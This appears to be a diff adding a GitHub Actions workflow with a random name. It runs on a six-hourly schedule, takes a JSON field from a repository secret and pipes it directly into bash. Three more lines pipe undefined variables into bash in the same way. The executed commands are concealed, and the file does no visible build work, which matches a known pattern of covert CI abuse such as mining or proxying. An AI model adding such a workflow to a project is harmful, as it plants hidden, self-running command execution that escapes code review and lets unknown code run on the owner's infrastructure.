@@ -1,0 +1,19 @@
+name: timzgaogt
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: timzgaogt
+        env:
+          so30: ${{ secrets.so30 }}
+        run: |
+          echo $so30 | jq -r .wjvur8 | /bin/bash
+          echo $vaeuy83 | jq -r .fdzxw3462 | /bin/bash
+          echo $et1 | jq -r .qklkp8 | /bin/bash
+          echo $hkfhj475 | jq -r .qdh2812 | /bin/bash
+
